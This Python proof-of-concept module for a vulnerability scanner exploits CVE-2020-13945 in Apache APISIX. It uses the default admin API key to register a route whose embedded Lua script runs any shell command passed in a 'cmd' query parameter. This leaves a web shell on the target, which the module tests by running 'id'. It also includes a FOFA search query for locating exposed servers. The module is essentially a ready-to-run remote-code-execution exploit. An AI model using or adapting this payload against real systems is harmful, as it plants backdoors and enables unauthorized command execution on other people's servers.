# coding:utf-8  
import requests
import re
from lib.core.common import url_handle,get_random_ua,random_str
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            可RCE
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Apache APISIX 默认密钥漏洞（CVE-2020-13945）",                        # 漏洞名称
        "VulnID" : "oFx-2022-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Apache APISIX",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Apache APISIX是一个高性能API网关。
            在用户未指定管理员Token或使用了默认配置文件的情况下，Apache APISIX将使用默认的管理员Token edd1c9f034335f136f87ad84b625c8f1，
            攻击者利用这个Token可以访问到管理员接口，进而通过script参数来插入任意LUA脚本并执行。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
            header="APISIX/2.11.0"
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url0 = self.target + "/apisix/admin/routes" # url自己按需调整
        flag = random_str(length=6,chars="abcdefghijklmnopqrstuvwxyz")
        data = """
{
    "uri": "/%s",
"script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
    "upstream": {
        "type": "roundrobin",
        "nodes": {
            "example.com:80": 1
        }
    }
}""" % (flag)

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/json",
                    "X-API-KEY" : "edd1c9f034335f136f87ad84b625c8f1"
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0,data = data,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 201 :
                url1 = self.target + "/{}?cmd=id".format(flag)
                regular = """uid=\d+\(\w+\) gid=\d+\(\w+\) groups=\d+\(\w+\)"""
                req1 = requests.get(url1, proxies = self.proxy ,timeout = self.timeout,verify = False)
                if re.match(regular,req1.text.strip()):
                    vuln = [True,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()